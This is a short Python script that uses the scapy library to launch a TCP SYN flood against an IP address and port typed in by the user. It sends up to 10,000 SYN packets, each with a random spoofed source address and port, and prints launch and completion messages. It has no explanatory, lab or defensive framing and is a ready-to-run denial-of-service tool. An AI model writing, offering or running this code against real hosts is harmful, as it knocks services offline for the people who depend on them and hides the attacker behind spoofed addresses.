from scapy.all import *
import random
import ipaddress

def syn_flood(target_ip, target_port, count):
    print(f"[*] Launching SYN flood on {target_ip}:{target_port} with {count} packets...")
    for _ in range(count):
        src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))  # spoofed IP
        src_port = random.randint(1024, 65535)

        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=int(target_port), flags='S', seq=random.randint(1000, 100000))

        send(packet, verbose=0)

    print("[*] SYN flood complete.")

def main():
    try:
        target_ip = input("Enter the target IP address: ").strip()
        target_port = input("Enter the target port: ").strip()
        num_requests = int(input("Enter the number of requests to send: ").strip())

        ipaddress.ip_address(target_ip)

        if not (0 < int(num_requests) <= 10000):
            raise ValueError("Number of requests must be between 1 and 10,000.")

        if not (0 < int(target_port) <= 65535):
            raise ValueError("port must be between 1 and 65535.")

    except ValueError as e:
        print(f"Error: {e}")
        return


    syn_flood(target_ip, target_port, num_requests)

if __name__ == "__main__":
    main()

